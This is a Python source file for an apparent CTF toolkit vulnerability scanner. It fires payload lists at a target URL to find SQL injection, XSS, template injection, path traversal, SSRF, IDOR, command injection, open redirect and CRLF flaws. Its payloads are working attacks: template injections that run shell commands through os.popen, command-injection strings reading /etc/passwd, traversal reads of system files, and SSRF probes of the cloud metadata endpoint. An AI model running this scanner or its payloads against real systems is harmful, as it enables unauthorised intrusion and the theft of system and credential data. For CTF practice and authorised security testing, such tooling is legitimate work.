"""
CTF Toolkit - Vulnerability Scanner
Auto-test for SQLi, XSS, SSTI, LFI, SSRF, IDOR, RCE, Open Redirect, CRLF.

Usage:
  python3 vulnscan.py -u http://target.com
  python3 vulnscan.py -u http://target.com/api/search
  python3 vulnscan.py -u http://target.com --type sqli
  python3 vulnscan.py -u http://target.com --type ssti,lfi,rce
"""
import argparse, html, re, sys, os, urllib.parse
sys.path.insert(0, os.path.dirname(__file__))
from core import *

class VulnScanner:
    def __init__(self, url, sess):
        self.url = url; self.sess = sess
        self.vulns = []; self.flags = []

    def _test(self, name, payloads, params, methods=None):
        if not methods: methods = ["GET","POST"]
        for payload, pattern in payloads:
            for m in methods:
                for p in params:
                    if m == "GET":
                        sep = "&" if "?" in self.url else "?"
                        r, e = safe_request(self.sess, "GET",
                            f"{self.url}{sep}{p}={urllib.parse.quote(payload)}")
                    else:
                        r, e = safe_request(self.sess, "POST", self.url, data={p: payload})
                    if e or not r: continue
                    if pattern and re.search(pattern, r.text, re.I):
                        v = f"{name} via {m} '{p}' → {payload[:50]}"
                        vuln(name, v); self.vulns.append((name, v))
                        fi = analyze_response(r); self.flags.extend(fi["flags"])
                        show_findings(fi, "      ")

    def sqli(self):
        info("Testing SQL Injection...")
        self._test("SQLi", [
            ("'", "syntax error|mysql|sqlite|postgresql|unterminated|sql"),
            ("' OR '1'='1", "true|admin|flag|welcome|success"),
            ("' OR 1=1--", "true|admin|flag|welcome|success"),
            ("\" OR 1=1--", "true|admin|flag|welcome|success"),
            ("' UNION SELECT NULL--", "union|null|column"),
            ("' UNION SELECT 1,2,3--", "1|2|3"),
            ("1 OR 1=1", "true|admin|flag"),
            ("1' ORDER BY 100--", "unknown column|order"),
            ("admin'--", "admin|welcome|dashboard|flag"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "xpath|version"),
        ], ["id","user","username","search","q","name","email","password","login"])

    def xss(self):
        info("Testing XSS...")
        for pl in ['<script>alert("XSS")</script>','<img src=x onerror=alert(1)>',
                    '"><svg onload=alert(1)>',"'-alert(1)-'",'<body onload=alert(1)>']:
            for p in ["q","search","name","input","text","comment","msg","message","user","value"]:
                sep = "&" if "?" in self.url else "?"
                r, e = safe_request(self.sess, "GET",
                    f"{self.url}{sep}{p}={urllib.parse.quote(pl)}")
                if e or not r: continue
                if pl in r.text or html.unescape(pl) in r.text:
                    v = f"Reflected XSS via '{p}' → {pl[:50]}"
                    vuln("XSS", v); self.vulns.append(("XSS", v))
                    self.flags.extend(analyze_response(r)["flags"])

    def ssti(self):
        info("Testing SSTI...")
        self._test("SSTI", [
            ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49"),
            ("{{7*'7'}}", "7777777"), ("{{config}}", "secret|key|debug"),
            ("{{config.items()}}", "secret|key|database"),
            ("{{self.__class__.__mro__}}", "object|type|class"),
            ("{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess|Popen|file"),
            ("{{request.application.__globals__}}", "os|sys|builtins"),
            ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid|gid|root"),
            ("{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}", "root:"),
        ], ["name","template","page","view","input","text","q","search",
            "user","message","msg","title","content","tpl","render"])

    def lfi(self):
        info("Testing LFI / Path Traversal...")
        self._test("LFI", [
            ("../etc/passwd","root:"), ("../../etc/passwd","root:"),
            ("../../../etc/passwd","root:"), ("../../../../etc/passwd","root:"),
            ("....//....//etc/passwd","root:"), ("..%2f..%2f..%2fetc%2fpasswd","root:"),
            ("/etc/passwd","root:"), ("file:///etc/passwd","root:"),
            ("/proc/self/environ","PATH=|HOME="),
            ("php://filter/convert.base64-encode/resource=index.php","PD9waH"),
            ("/flag","flag{|CTF{"), ("/flag.txt","flag{|CTF{"),
            ("../flag.txt","flag{|CTF{"), ("../../flag.txt","flag{|CTF{"),
        ], ["file","path","page","include","load","read","doc","template",
            "filename","filepath","dir","source","src","url","view","content"], methods=["GET"])

    def ssrf(self):
        info("Testing SSRF...")
        targets = ["http://127.0.0.1","http://127.0.0.1:8080","http://127.0.0.1:3000",
            "http://localhost","http://0.0.0.0","http://[::1]",
            "http://169.254.169.254/latest/meta-data/","file:///etc/passwd",
            "file:///flag.txt","dict://127.0.0.1:6379/INFO"]
        params = ["url","uri","href","link","src","source","dest","target",
            "redirect","redirect_url","path","proxy","fetch","request","load","page"]
        markers = ["root:","127.0.0.1","localhost","internal","ami-id","flag{","CTF{","redis"]
        for pl in targets:
            for p in params:
                sep = "&" if "?" in self.url else "?"
                r, e = safe_request(self.sess, "GET",
                    f"{self.url}{sep}{p}={urllib.parse.quote(pl)}")
                if e or not r: continue
                for mk in markers:
                    if mk.lower() in r.text.lower():
                        v = f"SSRF via '{p}' → {pl[:50]}"
                        vuln("SSRF", v); self.vulns.append(("SSRF", v))
                        self.flags.extend(analyze_response(r)["flags"]); break

    def idor(self):
        info("Testing IDOR...")
        for p in ["id","uid","user_id","userId","account","profile","order","doc","file_id","pid"]:
            for v in [0,1,2,100,999,-1,"admin","root"]:
                sep = "&" if "?" in self.url else "?"
                r, e = safe_request(self.sess, "GET", f"{self.url}{sep}{p}={v}")
                if e or not r: continue
                if r.status_code == 200 and len(r.content) > 100:
                    fi = analyze_response(r)
                    if fi["flags"] or fi["secrets"]:
                        vuln("IDOR", f"'{p}={v}'"); self.vulns.append(("IDOR", f"{p}={v}"))
                        self.flags.extend(fi["flags"]); show_findings(fi, "      ")

    def rce(self):
        info("Testing RCE / Command Injection...")
        self._test("RCE", [
            (";id","uid="), ("|id","uid="), ("$(id)","uid="), ("`id`","uid="),
            (";cat /etc/passwd","root:"), ("|cat /etc/passwd","root:"),
            (";cat /flag*","flag{|CTF{"), ("|cat /flag*","flag{|CTF{"),
            ("$(cat /flag.txt)","flag{|CTF{"),
            (";ls -la","total|drwx"), ("&&whoami","root|www-data|node|user"),
        ], ["cmd","command","exec","run","ping","ip","host","input","data","query","arg","process","action"])

    def open_redirect(self):
        info("Testing Open Redirect...")
        for pl in ["https://evil.com","//evil.com","/\\evil.com","https://evil.com@target.com"]:
            for p in ["redirect","redirect_url","redirect_uri","url","next","return","return_url","goto","to","continue","dest"]:
                sep = "&" if "?" in self.url else "?"
                r, e = safe_request(self.sess, "GET",
                    f"{self.url}{sep}{p}={urllib.parse.quote(pl)}")
                if e or not r: continue
                loc = r.headers.get("Location","")
                if "evil.com" in loc:
                    vuln("Open Redirect", f"'{p}' → {loc}")
                    self.vulns.append(("Open Redirect", f"{p}→{loc}"))

    def crlf(self):
        info("Testing CRLF Injection...")
        for pl in ["%0d%0aX-Injected: true", "\r\nX-Injected: true"]:
            for p in ["url","redirect","next","return","path","goto"]:
                sep = "&" if "?" in self.url else "?"
                r, e = safe_request(self.sess, "GET", f"{self.url}{sep}{p}={pl}")
                if e or not r: continue
                if "X-Injected" in r.headers:
                    vuln("CRLF", f"'{p}'"); self.vulns.append(("CRLF", p))

    ALL_TESTS = {
        "sqli": "sqli", "xss": "xss", "ssti": "ssti", "lfi": "lfi",
        "ssrf": "ssrf", "idor": "idor", "rce": "rce",
        "redirect": "open_redirect", "crlf": "crlf",
    }

    def run(self, types=None):
        section("VULNERABILITY SCANNER")
        info(f"Target: {self.url}")
        if types:
            info(f"Tests: {', '.join(types)}\n")
        else:
            types = list(self.ALL_TESTS.keys())
            info(f"Running ALL tests\n")

        for t in types:
            method_name = self.ALL_TESTS.get(t, t)
            if hasattr(self, method_name):
                getattr(self, method_name)()

        print()
        if self.vulns:
            success(f"Found {len(self.vulns)} potential vulnerabilities!")
            for i, (t, d) in enumerate(self.vulns, 1):
                print(f"    {C.R}{i:3d}. [{t}]{C.X} {d}")
        else:
            info("No vulnerabilities detected")
        for f in set(self.flags): flag(f)
        return self.vulns

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="CTF Vulnerability Scanner",
        epilog="Types: sqli, xss, ssti, lfi, ssrf, idor, rce, redirect, crlf")
    add_common_args(ap)
    ap.add_argument("--type", help="Specific tests (comma-sep): sqli,xss,ssti,lfi,ssrf,idor,rce,redirect,crlf")
    args = ap.parse_args()

    import urllib3; urllib3.disable_warnings()
    sess = session_from_args(args)
    types = args.type.split(",") if args.type else None
    results = VulnScanner(args.url, sess).run(types)
    save_results({"vulnerabilities": results}, args.output)
